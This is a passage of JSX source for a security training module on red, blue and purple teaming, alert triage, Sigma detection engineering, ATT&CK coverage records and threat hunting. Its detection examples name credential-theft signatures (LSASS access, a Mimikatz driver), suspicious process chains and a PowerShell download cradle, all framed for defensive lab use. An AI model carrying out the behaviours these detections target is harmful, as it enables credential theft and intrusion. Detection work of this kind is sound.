                <AlertTriangle className="w-4 h-4 shrink-0 text-amber-400 mt-0.5" />
                <span>
                  <strong>Ethical Boundary & Safety Mandate:</strong> All adversary simulations, atomic tests, and threat scenarios in this module are intended strictly for isolated labs, synthetic datasets, or explicitly authorized assessment targets. Never launch simulation commands against third-party or production systems without written authorization.
                </span>
              </div>
            </section>

            {/* 22.2 Learning Objectives */}
            <section className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 sm:p-8">
              <div className="flex items-center gap-2 mb-4">
                <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-purple-500/10 text-purple-400 border border-purple-500/20">
                  22.2 Learning Objectives
                </span>
              </div>
              <h3 className="text-xl font-bold text-white mb-6">Skills & Capabilities Developed</h3>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs text-slate-300">
                {[
                  "Explain the distinct roles and responsibilities of red, blue, and purple teams.",
                  "Distinguish penetration testing, red teaming, threat hunting, and detection engineering.",
                  "Use threat intelligence and MITRE ATT&CK to develop threat-informed security tests.",
                  "Identify the telemetry required to investigate suspicious endpoint, identity, and cloud behavior.",
                  "Design and validate detection rules (Sigma) using representative event data.",
                  "Apply alert triage, investigation, escalation, and incident-response procedures.",
                  "Measure detection quality using coverage, false-positive rates, and response metrics.",
                  "Plan a controlled purple team exercise with clear objectives and stop conditions.",
                  "Document evidence, communicate findings, and recommend defensive improvements.",
                  "Build a repeatable workflow for testing and continuously improving security detections.",
                ].map((obj, i) => (
                  <div key={i} className="p-3 rounded-lg bg-slate-950/60 border border-slate-800/80 flex items-start gap-2.5">
                    <CheckCircle className="w-4 h-4 text-purple-400 shrink-0 mt-0.5" />
                    <span>{obj}</span>
                  </div>
                ))}
              </div>
            </section>

            {/* 22.3 Understanding Red, Blue, and Purple Teams */}
            <section className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 sm:p-8">
              <div className="flex items-center gap-2 mb-3">
                <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-purple-500/10 text-purple-400 border border-purple-500/20">
                  22.3 Foundations
                </span>
              </div>
              <h3 className="text-xl font-bold text-white mb-4">
                Understanding Red, Blue, and Purple Teams
              </h3>

              <p className="text-slate-300 text-sm leading-relaxed mb-6">
                Information security functions are often divided into distinct tactical groups. While they operate with different mindsets, their ultimate goal is identical: resilience against real-world adversaries.
              </p>

              {/* 22.3.1 Comparing the Teams Table */}
              <h4 className="text-base font-semibold text-white mb-3 flex items-center gap-2">
                <span>22.3.1 Comparing the Teams Across Core Operational Dimensions</span>
              </h4>

              <div className="overflow-x-auto rounded-xl border border-slate-800 mb-6">
                <table className="w-full text-xs text-left text-slate-300">
                  <thead className="bg-slate-900 text-slate-200 border-b border-slate-800 font-semibold">
                    <tr>
                      <th className="p-3.5">Dimension</th>
                      <th className="p-3.5 text-rose-400">Red Team</th>
                      <th className="p-3.5 text-cyan-400">Blue Team</th>
                      <th className="p-3.5 text-purple-400">Purple Team</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/80 font-mono text-[11px]">
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3.5 font-sans font-semibold text-white">Primary objective</td>
                      <td className="p-3.5">Test defenses from an adversary perspective</td>
                      <td className="p-3.5">Detect, investigate, and respond</td>
                      <td className="p-3.5">Improve security through collaboration</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3.5 font-sans font-semibold text-white">Typical activities</td>
                      <td className="p-3.5">Adversary emulation, control validation</td>
                      <td className="p-3.5">Monitoring, hunting, incident response</td>
                      <td className="p-3.5">Detection tests, joint analysis, retesting</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3.5 font-sans font-semibold text-white">Main evidence</td>
                      <td className="p-3.5">Observed control weaknesses and achieved objectives</td>
                      <td className="p-3.5">Alerts, event records, investigation findings</td>
                      <td className="p-3.5">Detection gaps and validated improvements</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3.5 font-sans font-semibold text-white">Success measure</td>
                      <td className="p-3.5">Objectives and agreed test questions answered</td>
                      <td className="p-3.5">Reliable detection and effective response</td>
                      <td className="p-3.5">Demonstrable improvement in defensive capability</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3.5 font-sans font-semibold text-white">Key output</td>
                      <td className="p-3.5">Adversary simulation report</td>
                      <td className="p-3.5">Incident and detection records</td>
                      <td className="p-3.5">Detection improvements and retest results</td>
                    </tr>
                  </tbody>
                </table>
              </div>

              <div className="p-4 rounded-xl bg-purple-500/10 border border-purple-500/20 text-xs text-purple-300">
                <strong className="text-white">Important Distinction:</strong> A penetration test generally concentrates on finding and validating vulnerabilities in a defined target application or network range. A red team exercise evaluates whether an organization&apos;s people, processes, and technologies can detect and resist a realistic, objective-driven simulation. <em>Purple teaming is a collaborative improvement process</em>, not simply another name for penetration testing.
              </div>
            </section>

            {/* 22.4 Red Team Operations: Planning and Execution */}
            <section className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 sm:p-8">
              <div className="flex items-center gap-2 mb-3">
                <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-rose-500/10 text-rose-400 border border-rose-500/20">
                  22.4 Red Team Operations
                </span>
              </div>
              <h3 className="text-xl font-bold text-white mb-4">
                Red Team Operations: Planning and Execution
              </h3>
              <p className="text-slate-300 text-sm leading-relaxed mb-6">
                Red team operations must be objective-driven, controlled, and evidence-based. The purpose is not to run as many automated exploits as possible; it is to answer a specific security question, such as whether an organization can identify suspicious account activity or detect an unexpected change to a critical asset.
              </p>

              {/* 22.4.1 & 22.4.2 */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                <div className="p-5 rounded-xl bg-slate-950/60 border border-slate-800">
                  <h4 className="text-sm font-bold text-white mb-2 flex items-center gap-2">
                    <Target className="w-4 h-4 text-rose-400" /> 22.4.1 Define the Objective
                  </h4>
                  <p className="text-xs text-slate-300 mb-3">
                    Every engagement begins with a clearly defined objective bounded by time and authorization:
                  </p>
                  <ul className="space-y-1.5 text-xs text-slate-400 list-disc list-inside">
                    <li>Determine whether unusual administrative activity generates a security alert.</li>
                    <li>Evaluate whether endpoint telemetry captures suspicious script execution.</li>
                    <li>Test whether access-control monitoring detects unauthorized resource access.</li>
                    <li>Assess whether responders can investigate a synthetic sequence of login events.</li>
                    <li>Validate whether a documented incident-response procedure works under stress.</li>
                  </ul>
                </div>

                <div className="p-5 rounded-xl bg-slate-950/60 border border-slate-800">
                  <h4 className="text-sm font-bold text-white mb-2 flex items-center gap-2">
                    <ShieldAlert className="w-4 h-4 text-amber-400" /> 22.4.2 Rules of Engagement (RoE)
                  </h4>
                  <p className="text-xs text-slate-300 mb-3">
                    Mandatory parameters documented and signed before running any simulation:
                  </p>
                  <div className="grid grid-cols-2 gap-2 text-[11px] font-mono text-slate-300">
                    <span className="p-1.5 rounded bg-slate-900 border border-slate-800">• Authorization: Named owner</span>
                    <span className="p-1.5 rounded bg-slate-900 border border-slate-800">• Scope: Explicit hosts/IPs</span>
                    <span className="p-1.5 rounded bg-slate-900 border border-slate-800">• Exclusions: Out-of-bounds assets</span>
                    <span className="p-1.5 rounded bg-slate-900 border border-slate-800">• Test Window: Start/end UTC</span>
                    <span className="p-1.5 rounded bg-slate-900 border border-slate-800">• Stop Conditions: Safety limits</span>
                    <span className="p-1.5 rounded bg-slate-900 border border-slate-800">• Cleanup: Removal of artifacts</span>
                  </div>
                </div>
              </div>

              {/* 22.4.3 Threat-Informed Test Scenario Planning Matrix */}
              <h4 className="text-sm font-bold text-white mb-3 flex items-center gap-2">
                <Radar className="w-4 h-4 text-purple-400" /> 22.4.3 Threat-Informed Scenario Planning Matrix
              </h4>
              <div className="overflow-x-auto rounded-xl border border-slate-800 mb-6">
                <table className="w-full text-xs text-left text-slate-300">
                  <thead className="bg-slate-900 text-slate-200 border-b border-slate-800 font-semibold">
                    <tr>
                      <th className="p-3">Test Question</th>
                      <th className="p-3 text-rose-400">Simulated Behavior</th>
                      <th className="p-3 text-cyan-400">Defensive Question</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/80 font-mono text-[11px]">
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Can suspicious execution be detected?</td>
                      <td className="p-3">Run a benign, approved test process (e.g. whoami / PowerShell cradle)</td>
                      <td className="p-3">Was process telemetry (Sysmon ID 1) recorded and correlated?</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Can unusual authentication be identified?</td>
                      <td className="p-3">Generate synthetic failed-login events for a single account</td>
                      <td className="p-3">Did the threshold or correlation rule trigger in the SIEM?</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Can unauthorized changes be detected?</td>
                      <td className="p-3">Modify a disposable lab configuration or local security policy</td>
                      <td className="p-3">Was the change logged and attributed to the test principal?</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Can responders investigate a suspicious sequence?</td>
                      <td className="p-3">Supply a synthetic timeline of reconnaissance and logon events</td>
                      <td className="p-3">Can the analyst reconstruct the sequence without missing hops?</td>
                    </tr>
                  </tbody>
                </table>
              </div>

              {/* 22.4.4 Controlled Evidence Collection */}
              <div className="p-4 rounded-xl bg-slate-950/60 border border-slate-800 text-xs text-slate-300">
                <span className="font-bold text-white">22.4.4 Evidence Handling Requirement:</span> For each simulation step, record: Test identifier, start/end timestamps (UTC), target host/account, expected events, observed events/alerts, analyst actions, and cleanup verification. A failed detection does not imply complete program failure; it isolates whether the gap was caused by sensor failure, pipeline drop, parser defect, or alert suppression.
              </div>
            </section>

            {/* 22.5 Blue Team Operations: Monitoring, Triage, and Response */}
            <section className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 sm:p-8">
              <div className="flex items-center gap-2 mb-3">
                <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-cyan-500/10 text-cyan-400 border border-cyan-500/20">
                  22.5 Blue Team Operations
                </span>
              </div>
              <h3 className="text-xl font-bold text-white mb-4">
                Blue Team Operations: Monitoring, Triage, and Response
              </h3>
              <p className="text-slate-300 text-sm leading-relaxed mb-6">
                The blue team turns raw security telemetry into defensible decisions. A mature operation combines reliable telemetry, meaningful detections, contextual investigation, and carefully controlled response actions.
              </p>

              {/* 22.5.1 The 5-Stage Monitoring Pipeline */}
              <h4 className="text-sm font-bold text-white mb-3 flex items-center gap-2">
                <Workflow className="w-4 h-4 text-cyan-400" /> 22.5.1 The Security Monitoring Pipeline
              </h4>

              <div className="grid grid-cols-1 sm:grid-cols-5 gap-2 text-center text-xs mb-8">
                <div className="p-3 rounded-lg bg-slate-950/80 border border-slate-800">
                  <div className="w-6 h-6 rounded-full bg-cyan-500/20 text-cyan-400 font-bold mx-auto mb-2 flex items-center justify-center text-xs">1</div>
                  <div className="font-bold text-white mb-1">Generate Events</div>
                  <div className="text-[11px] text-slate-400">Endpoints, IdPs, cloud audit, firewalls</div>
                </div>
                <div className="p-3 rounded-lg bg-slate-950/80 border border-slate-800">
                  <div className="w-6 h-6 rounded-full bg-cyan-500/20 text-cyan-400 font-bold mx-auto mb-2 flex items-center justify-center text-xs">2</div>
                  <div className="font-bold text-white mb-1">Collect & Normalize</div>
                  <div className="text-[11px] text-slate-400">Agents, log shippers, ECS parsing, timestamps</div>
                </div>
                <div className="p-3 rounded-lg bg-slate-950/80 border border-slate-800">
                  <div className="w-6 h-6 rounded-full bg-cyan-500/20 text-cyan-400 font-bold mx-auto mb-2 flex items-center justify-center text-xs">3</div>
                  <div className="font-bold text-white mb-1">Analyze & Correlate</div>
                  <div className="text-[11px] text-slate-400">Sigma rules, thresholds, multi-hop correlation</div>
                </div>
                <div className="p-3 rounded-lg bg-slate-950/80 border border-slate-800">
                  <div className="w-6 h-6 rounded-full bg-cyan-500/20 text-cyan-400 font-bold mx-auto mb-2 flex items-center justify-center text-xs">4</div>
                  <div className="font-bold text-white mb-1">Alert & Investigate</div>
                  <div className="text-[11px] text-slate-400">Triage queue, asset context, evidence correlation</div>
                </div>
                <div className="p-3 rounded-lg bg-slate-950/80 border border-slate-800">
                  <div className="w-6 h-6 rounded-full bg-cyan-500/20 text-cyan-400 font-bold mx-auto mb-2 flex items-center justify-center text-xs">5</div>
                  <div className="font-bold text-white mb-1">Respond & Improve</div>
                  <div className="text-[11px] text-slate-400">Containment, tuning, retesting, regression checks</div>
                </div>
              </div>

              {/* 22.5.2 Telemetry Sources Table */}
              <h4 className="text-sm font-bold text-white mb-3 flex items-center gap-2">
                <Database className="w-4 h-4 text-cyan-400" /> 22.5.2 Common Telemetry Sources & Investigation Context
              </h4>
              <div className="overflow-x-auto rounded-xl border border-slate-800 mb-8">
                <table className="w-full text-xs text-left text-slate-300">
                  <thead className="bg-slate-900 text-slate-200 border-b border-slate-800 font-semibold">
                    <tr>
                      <th className="p-3">Source</th>
                      <th className="p-3 text-cyan-400">Useful Fields</th>
                      <th className="p-3 text-slate-300">Typical Investigation</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/80 font-mono text-[11px]">
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Endpoint operating system</td>
                      <td className="p-3">Process, parent process, user, timestamp, host, CLI</td>
                      <td className="p-3 font-sans">Suspicious execution or unexpected administrative activity</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Identity provider (IdP)</td>
                      <td className="p-3">User, source IP, authentication result, MFA status</td>
                      <td className="p-3 font-sans">Repeated failures, unusual sign-ins, privilege changes</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">DNS resolver</td>
                      <td className="p-3">Query domain, response IP, client IP, timestamp</td>
                      <td className="p-3 font-sans">Unexpected C2 domain lookups, DGA traffic</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Network security device</td>
                      <td className="p-3">Src/dst IP, ports, action, protocol, bytes</td>
                      <td className="p-3 font-sans">Lateral movement or exfiltration connection attempts</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Cloud audit log</td>
                      <td className="p-3">Principal, action, resource ARN, result, userAgent</td>
                      <td className="p-3 font-sans">Unusual API calls, IAM policy modifications, bucket exposures</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Web application</td>
                      <td className="p-3">Route, account, response status, request ID, headers</td>
                      <td className="p-3 font-sans">BOLA/IDOR access violations, SQLi/XSS injection attempts</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">EDR platform</td>
                      <td className="p-3">Alert ID, process lineage tree, host isolation state</td>
                      <td className="p-3 font-sans">In-memory code injection, token manipulation containment</td>
                    </tr>
                  </tbody>
                </table>
              </div>

              {/* 22.5.3 Alert Triage Workflow & 22.5.4 Severity Matrix */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="p-5 rounded-xl bg-slate-950/60 border border-slate-800">
                  <h4 className="text-sm font-bold text-white mb-2 flex items-center gap-2">
                    <Filter className="w-4 h-4 text-cyan-400" /> 22.5.3 Alert Triage Workflow (7 Steps)
                  </h4>
                  <ol className="space-y-1 text-xs text-slate-300 list-decimal list-inside">
                    <li><strong className="text-white">Validate alert:</strong> Confirm rule, fields, time range, source.</li>
                    <li><strong className="text-white">Establish context:</strong> Identify user, asset role, scheduled changes.</li>
                    <li><strong className="text-white">Correlate evidence:</strong> Check identity, network, host logs.</li>
                    <li><strong className="text-white">Assess impact:</strong> Classify as benign, suspicious, or confirmed incident.</li>
                    <li><strong className="text-white">Choose action:</strong> Close with justification, monitor, or escalate.</li>
                    <li><strong className="text-white">Record decision:</strong> Preserve evidence, rationale, and timeline.</li>
                    <li><strong className="text-white">Improve detection:</strong> Tune rule if noisy, incomplete, or false positive.</li>
                  </ol>
                </div>

                <div className="p-5 rounded-xl bg-slate-950/60 border border-slate-800">
                  <h4 className="text-sm font-bold text-white mb-2 flex items-center gap-2">
                    <Flame className="w-4 h-4 text-rose-400" /> 22.5.4 Incident Severity & Escalation (NIST SP 800-61)
                  </h4>
                  <div className="space-y-2 text-xs">
                    <div className="p-2 rounded bg-rose-500/10 border border-rose-500/30 flex justify-between items-center">
                      <span className="font-bold text-rose-400">Critical</span>
                      <span className="text-slate-300">Confirmed compromise of critical system; immediate containment</span>
                    </div>
                    <div className="p-2 rounded bg-orange-500/10 border border-orange-500/30 flex justify-between items-center">
                      <span className="font-bold text-orange-400">High</span>
                      <span className="text-slate-300">Unauthorized privileged activity; urgent investigation & owner alert</span>
                    </div>
                    <div className="p-2 rounded bg-amber-500/10 border border-amber-500/30 flex justify-between items-center">
                      <span className="font-bold text-amber-400">Medium</span>
                      <span className="text-slate-300">Suspicious activity requiring validation; prioritized review</span>
                    </div>
                    <div className="p-2 rounded bg-blue-500/10 border border-blue-500/30 flex justify-between items-center">
                      <span className="font-bold text-blue-400">Low</span>
                      <span className="text-slate-300">Weak signal or policy deviation; routine review and documented closure</span>
                    </div>
                  </div>
                </div>
              </div>
            </section>

            {/* 22.6 Detection Engineering: From Hypothesis to Validated Rule */}
            <section className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 sm:p-8">
              <div className="flex items-center gap-2 mb-3">
                <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-purple-500/10 text-purple-400 border border-purple-500/20">
                  22.6 Detection Engineering
                </span>
              </div>
              <h3 className="text-xl font-bold text-white mb-4">
                Detection Engineering: From Hypothesis to Validated Rule
              </h3>
              <p className="text-slate-300 text-sm leading-relaxed mb-6">
                Detection engineering is the disciplined software engineering practice of designing, implementing, testing, deploying, and tuning detection logic as code.
              </p>

              {/* 22.6.1 The 7 Lifecycle Stages */}
              <h4 className="text-sm font-bold text-white mb-3 flex items-center gap-2">
                <Workflow className="w-4 h-4 text-purple-400" /> 22.6.1 The Detection Engineering Lifecycle
              </h4>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs mb-8">
                <div className="p-3 rounded-lg bg-slate-950/60 border border-slate-800 flex items-start gap-2">
                  <span className="font-mono font-bold text-purple-400 shrink-0">1.</span>
                  <div>
                    <strong className="text-white">Define Threat Hypothesis:</strong> State what suspicious behavior the rule detects and the adversary threat model behind it.
                  </div>
                </div>
                <div className="p-3 rounded-lg bg-slate-950/60 border border-slate-800 flex items-start gap-2">
                  <span className="font-mono font-bold text-purple-400 shrink-0">2.</span>
                  <div>
                    <strong className="text-white">Identify Required Telemetry:</strong> Pinpoint exact log sources, audit channels, and fields (e.g. Sysmon Event ID 1).
                  </div>
                </div>
                <div className="p-3 rounded-lg bg-slate-950/60 border border-slate-800 flex items-start gap-2">
                  <span className="font-mono font-bold text-purple-400 shrink-0">3.</span>
                  <div>
                    <strong className="text-white">Design Analytic Logic:</strong> Author selection filters, threshold counters, grouping keys, and exclusion filters.
                  </div>
                </div>
                <div className="p-3 rounded-lg bg-slate-950/60 border border-slate-800 flex items-start gap-2">
                  <span className="font-mono font-bold text-purple-400 shrink-0">4.</span>
                  <div>
                    <strong className="text-white">Test Against Known Datasets:</strong> Run synthetic test cases with positive triggers and negative benign controls.
                  </div>
                </div>
                <div className="p-3 rounded-lg bg-slate-950/60 border border-slate-800 flex items-start gap-2">
                  <span className="font-mono font-bold text-purple-400 shrink-0">5.</span>
                  <div>
                    <strong className="text-white">Validate in Target SIEM/EDR:</strong> Confirm field parser compatibility, regex execution speed, and index performance.
                  </div>
                </div>
                <div className="p-3 rounded-lg bg-slate-950/60 border border-slate-800 flex items-start gap-2">
                  <span className="font-mono font-bold text-purple-400 shrink-0">6.</span>
                  <div>
                    <strong className="text-white">Deploy with Active Monitoring:</strong> Track daily alert volume, triage times, and false-positive ratios in staging.
                  </div>
                </div>
                <div className="p-3 rounded-lg bg-slate-950/60 border border-slate-800 md:col-span-2 flex items-start gap-2">
                  <span className="font-mono font-bold text-purple-400 shrink-0">7.</span>
                  <div>
                    <strong className="text-white">Tune and Regression Test:</strong> Refine exclusions without hiding malicious evasion; retest against historical benchmarks.
                  </div>
                </div>
              </div>

              {/* 22.6.2 Logic Architectures & 22.6.3 Hypothesis Example */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                <div className="p-5 rounded-xl bg-slate-950/60 border border-slate-800">
                  <h4 className="text-sm font-bold text-white mb-2">22.6.2 Detection Logic Architectures</h4>
                  <ul className="space-y-2 text-xs text-slate-300">
                    <li><strong className="text-cyan-400">Single-Event:</strong> Instant trigger on high-fidelity signature (e.g. LSASS access or Mimikatz driver loaded).</li>
                    <li><strong className="text-amber-400">Threshold:</strong> Aggregates repetitive low-signal events (e.g. &gt;5 failed logons within 1 minute).</li>
                    <li><strong className="text-purple-400">Correlation:</strong> Combines disparate telemetry streams (e.g. anomalous VPN logon followed by privilege escalation).</li>
                    <li><strong className="text-emerald-400">Behavioral/Baseline:</strong> Identifies deviations from learned historical patterns (requires operational variance tolerance).</li>
                  </ul>
                </div>

                <div className="p-5 rounded-xl bg-slate-950/60 border border-slate-800">
                  <h4 className="text-sm font-bold text-white mb-2">22.6.3 Concrete Detection Hypothesis</h4>
                  <div className="text-xs text-slate-300 space-y-2">
                    <p><strong className="text-white">Scenario:</strong> Synthetic failed logons targeting test accounts in lab identity system.</p>
                    <p><strong className="text-white">Hypothesis:</strong> A burst of &gt;5 failed authentication events for the same account in &lt;1m indicates password guessing or service misconfiguration.</p>
                    <p><strong className="text-white">Required Fields:</strong> Timestamp, TargetUserName, EventID (4625), Status/SubStatus, WorkstationName.</p>
                    <p><strong className="text-white">Analytic:</strong> Count failed events per TargetUserName over a rolling 1-minute window.</p>
                  </div>
                </div>
              </div>

              {/* 22.6.4 Writing Portable Detections with Sigma */}
              <div className="p-5 rounded-xl bg-slate-950/80 border border-slate-800 mb-6">
                <div className="flex items-center justify-between mb-3">
                  <div className="flex items-center gap-2 text-xs font-bold text-white">
                    <FileCode className="w-4 h-4 text-purple-400" />
                    <span>22.6.4 Portable Sigma Rule Specification Example</span>
                  </div>
                  <button
                    onClick={() => copyToClipboard(generatedSigmaYaml, "sigma-yaml")}
                    className="flex items-center gap-1 px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs transition"
                  >
                    {copiedCodeId === "sigma-yaml" ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                    <span>{copiedCodeId === "sigma-yaml" ? "Copied" : "Copy YAML"}</span>
                  </button>
                </div>

                <pre className="p-4 rounded-lg bg-slate-900 border border-slate-800 text-[11px] font-mono text-purple-300 overflow-x-auto leading-relaxed">
                  {generatedSigmaYaml}
                </pre>

                <div className="mt-3 text-[11px] text-slate-400 leading-relaxed">
                  <strong>Architecture Note:</strong> Standard Sigma describes event filtering patterns. Complex time-window aggregations and stateful correlation (<code className="text-purple-300">count() by user &gt; 5</code>) require SIEM-specific conversion (e.g. via pySigma) or native correlation pipelines. Always validate the compiled query on your target platform.
                </div>
              </div>
            </section>

            {/* 22.7 Threat Intelligence and MITRE ATT&CK Mapping */}
            <section className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 sm:p-8">
              <div className="flex items-center gap-2 mb-3">
                <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-purple-500/10 text-purple-400 border border-purple-500/20">
                  22.7 Threat Intelligence
                </span>
              </div>
              <h3 className="text-xl font-bold text-white mb-4">
                Threat Intelligence and MITRE ATT&CK Mapping
              </h3>
              <p className="text-slate-300 text-sm leading-relaxed mb-6">
                Cyber threat intelligence (CTI) informs detection engineering of genuine adversary tradecraft. However, simply coloring cells on an ATT&CK matrix does not equal defensive capability. Real coverage requires tested telemetry and validated analytics.
              </p>

              {/* 22.7.2 ATT&CK Coverage Record Table */}
              <h4 className="text-sm font-bold text-white mb-3 flex items-center gap-2">
                <Radar className="w-4 h-4 text-purple-400" /> 22.7.2 Meaningful ATT&CK Coverage Documentation Standard
              </h4>

              <div className="overflow-x-auto rounded-xl border border-slate-800 mb-6">
                <table className="w-full text-xs text-left text-slate-300">
                  <thead className="bg-slate-900 text-slate-200 border-b border-slate-800 font-semibold">
                    <tr>
                      <th className="p-3">Field</th>
                      <th className="p-3 text-purple-400">What to Record</th>
                      <th className="p-3 text-slate-400">Production Example</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/80 font-mono text-[11px]">
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Technique / Behavior</td>
                      <td className="p-3 font-sans">Adversary technique being evaluated</td>
                      <td className="p-3">T1110.001 (Password Guessing)</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Business Relevance</td>
                      <td className="p-3 font-sans">Why this threat matters to corporate infrastructure</td>
                      <td className="p-3 font-sans">Protects enterprise SSO and customer portals</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Required Telemetry</td>
                      <td className="p-3 font-sans">Events, channels, and specific fields needed</td>
                      <td className="p-3">Event 4625 with Status 0xC000006A</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Detection Analytic</td>
                      <td className="p-3 font-sans">Rule or correlation engine responsible</td>
                      <td className="p-3">SIGMA-AUTH-BURST-01 (Threshold: &gt;5/1m)</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Validation Method</td>
                      <td className="p-3 font-sans">Synthetic test, approved emulation, or historical logs</td>
                      <td className="p-3">Atomic Red Team Test PT-001 in lab</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Result Status</td>
                      <td className="p-3 font-sans">Validated detected, partial, or blind spot</td>
                      <td className="p-3 text-emerald-400 font-bold">Validated Detected (MTTD: 18s)</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Limitations & Gaps</td>
                      <td className="p-3 font-sans">Known blind spots or missing coverage areas</td>
                      <td className="p-3 font-sans">Low-and-slow attacks (1 guess/hr) missed</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Owner & Last Validated</td>
                      <td className="p-3 font-sans">Responsible engineer and validation timestamp</td>
                      <td className="p-3">SecOps Team (2026-10-15 UTC)</td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </section>

            {/* 22.8 Threat Hunting and Detection Gaps */}
            <section className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 sm:p-8">
              <div className="flex items-center gap-2 mb-3">
                <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-cyan-500/10 text-cyan-400 border border-cyan-500/20">
                  22.8 Threat Hunting
                </span>
              </div>
              <h3 className="text-xl font-bold text-white mb-4">
                Threat Hunting and Detection Gaps
              </h3>
              <p className="text-slate-300 text-sm leading-relaxed mb-6">
                Threat hunting is a proactive, hypothesis-driven search through security telemetry to detect malicious activity that bypassed automated alerting. A hunt that finds no adversary is still highly valuable—it validates data visibility and confirms that baseline behaviors match expectations.
              </p>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="p-5 rounded-xl bg-slate-950/60 border border-slate-800">
                  <h4 className="text-sm font-bold text-white mb-2 flex items-center gap-2">
                    <Search className="w-4 h-4 text-cyan-400" /> 22.8.1 Realistic Hunting Hypotheses
                  </h4>
                  <ul className="space-y-2 text-xs text-slate-300 list-disc list-inside">
                    <li>Privileged accounts performing administrative actions outside normal working hours.</li>
                    <li>Service accounts generating authentication failures across unrelated domain controllers.</li>
                    <li>Critical configuration changes or registry edits lacking corresponding change-management tickets.</li>
                    <li>Suspicious parent-child process relationships (e.g. <code className="text-purple-300">word.exe -&gt; cmd.exe</code> or <code className="text-purple-300">w3wp.exe -&gt; powershell.exe</code>).</li>
                    <li>Cloud IAM audit logs displaying policy modifications from novel geographic regions.</li>
                  </ul>
                </div>

                <div className="p-5 rounded-xl bg-slate-950/60 border border-slate-800">
                  <h4 className="text-sm font-bold text-white mb-2 flex items-center gap-2">
                    <Workflow className="w-4 h-4 text-purple-400" /> 22.8.2 The 7-Step Hunting Methodology
                  </h4>
                  <ol className="space-y-1.5 text-xs text-slate-300 list-decimal list-inside">
                    <li><strong className="text-white">Form hypothesis:</strong> State suspected behavior based on threat intel.</li>
                    <li><strong className="text-white">Identify evidence:</strong> Select telemetry sources, fields, and time range.</li>
                    <li><strong className="text-white">Establish baseline:</strong> Filter out legitimate operational activity.</li>
                    <li><strong className="text-white">Search and correlate:</strong> Query data looking for anomalies and outliers.</li>
                    <li><strong className="text-white">Validate findings:</strong> Confirm whether anomalies are malicious or benign.</li>
                    <li><strong className="text-white">Record outcomes:</strong> Document visibility gaps or confirmed incidents.</li>
                    <li><strong className="text-white">Engineer detection:</strong> Turn repeatable discoveries into permanent Sigma rules.</li>
                  </ol>
                </div>
              </div>
            </section>

            {/* 22.9 Purple Team Exercises: Collaborative Security Validation */}
            <section className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 sm:p-8">
              <div className="flex items-center gap-2 mb-3">
                <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-purple-500/10 text-purple-400 border border-purple-500/20">
                  22.9 Purple Team Exercises
                </span>
              </div>
              <h3 className="text-xl font-bold text-white mb-4">
                Purple Team Exercises: Collaborative Security Validation
              </h3>
              <p className="text-slate-300 text-sm leading-relaxed mb-6">
